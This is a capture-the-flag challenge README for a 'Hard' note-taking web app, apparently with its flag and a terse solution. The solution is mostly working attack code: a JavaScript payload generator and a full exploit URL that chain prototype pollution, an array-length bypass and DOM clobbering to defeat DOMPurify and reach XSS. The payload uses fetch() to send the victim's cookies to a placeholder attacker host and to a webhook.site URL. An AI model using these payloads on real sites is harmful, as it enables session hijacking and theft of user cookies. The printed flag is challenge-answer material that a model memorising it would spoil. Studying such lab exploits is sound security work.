# LooooongNooooote

**Author** : DreyAnd    
**Difficulty** : <font color='red'>Hard</font>  
**Description** : AAAAAH, someone has ruined ShortNote! It's time for revenge. This time, I've come up with a new, modern note-taking app, I even apply sanitization! 😈

**Infrastructure requirements** : docker, zip

Flag: `SCC{Th1s_W4s_T00_l000ng_S0rry_AAAAAAAAAA!}`

# Solution <writeup to-be-done>:

**TLDR**: CSPP + `length` bypass via array slice overflow + DOM Clobbering to bypass DOMPurify -> XSS

Payload generator:
```js
let payload = '<a id="debug"></a><a id="debug" name="timeout" href="cid:fetch(`https://ATTACKER/?c=${encodeURIComponent(document.cookie)}`)"></a>'
let exp = "noteContent[]=A&";

for (let i = 0; i < 36; i++) {
    if (i == 34) {
        exp += "noteContent[]=A"
        break
    }
    if (i == 23) {
        exp += `noteContent[]=${payload}&`;
    } else {
        exp += "noteContent[]=A&";
    }
}

console.log(exp);
```

Solution URL to submit to bot:
```
http://localhost:7777/?username=__proto__&noteName=uuid&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=<a%20id="debug"></a><a%20id="debug"%20name="timeout"%20href="cid:fetch(`https://webhook.site/d1c6a1f8-24af-44c7-b6ce-1ee0e18440d4/?c=${encodeURIComponent(document.cookie)}`)"></a>&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&noteContent[]=A&previewNote=1
```
